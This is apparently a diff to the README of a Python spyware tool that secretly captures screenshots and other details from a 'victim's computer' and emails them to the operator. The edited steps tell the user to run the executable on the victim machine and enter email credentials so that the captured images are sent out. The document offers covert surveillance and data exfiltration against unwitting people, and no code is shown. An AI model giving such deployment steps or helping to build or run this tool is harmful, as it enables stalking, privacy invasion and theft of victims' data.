@@ -4,8 +4,8 @@ A Python tool to perform image spy operation on victims computer. It takes the s
 
 ## Steps to Use:
 
-1. Run the script on the victim machine based on the victim operating system
-2. Enter the Email id and password to send Emails to you.
+1. open this file and run the exe on the victim machine based on the victim operating system
+2. Before run the exe file Enter the Email id and password to send Emails to you.
 3. Enter the Email id for what mail id you want to get the Images/Screenshots and other details.
 
 5. Remaining task is going to handle by the script.
